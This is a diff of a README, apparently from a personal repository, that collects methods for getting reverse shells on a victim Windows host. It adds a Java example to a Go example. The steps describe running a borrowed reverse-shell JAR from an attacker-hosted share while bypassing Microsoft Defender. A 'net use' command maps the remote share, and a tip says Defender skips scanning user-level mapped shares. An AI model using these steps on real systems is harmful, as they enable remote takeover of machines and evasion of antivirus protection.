@@ -5,7 +5,13 @@ This is my collection of ways to Execute Reverse Shells on a Victim Windows Host
 
 More will be added as and when I have the time to research it.
 
-The process is extremely simple.
+Programming Languages Tested With
+
+1. [Go](#Go)
+2. [Java](#example-with-java)
+
+
+## <a name="Go"></a>The process is extremely simple - Example with Go
 
 1. Have a Windows Victim where you can run commands
 2. Have a Windows Attack Box with your Programming Environment of choice - Python Java and Go are the only ones I have tested so far
@@ -33,3 +39,17 @@ The process is extremely simple.
 According to the Windows Documentation, Defender wont scan User-Level Mapped Shares i.e if you use `net use g: \\192.168.59.60\Go /USER:user Password!` it wont scan and therefore wont attempt to delete the files on the remote share. It can however pick a script up when attempting to execute. Network Shares are scanned. Just something to keep in mind. https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-advanced-scan-types-microsoft-defender-antivirus?view=o365-worldwide
 
 ![image](https://user-images.githubusercontent.com/130473605/235164338-683ff6a4-e68d-4b53-9d40-d1a274310c1f.png)
+
+## <a name="Java"></a>Example with Java
+
+1. Download and Install JRE 
+2. Share /bin folder - C:\Program Files\Java\jre-1.8\bin
+3. Download Reverse-Shell.jar and place in /bin folder - Stolen from https://github.com/ivan-sincek/java-reverse-tcp/blob/main/jar/Reverse_Shell.jar
+4. Execute java and jar file whilst bypassing Defender
+
+![image](https://user-images.githubusercontent.com/130473605/235175752-b3b26e3d-5f12-4052-a124-a498cc28a8c8.png)
+
+5. Enjoy a Java Reverse Shell from a Windows Host that doesnt have Java Installed
+
+![image](https://user-images.githubusercontent.com/130473605/235176177-20c77e58-0a72-49e4-8036-317389f6591d.png)
+
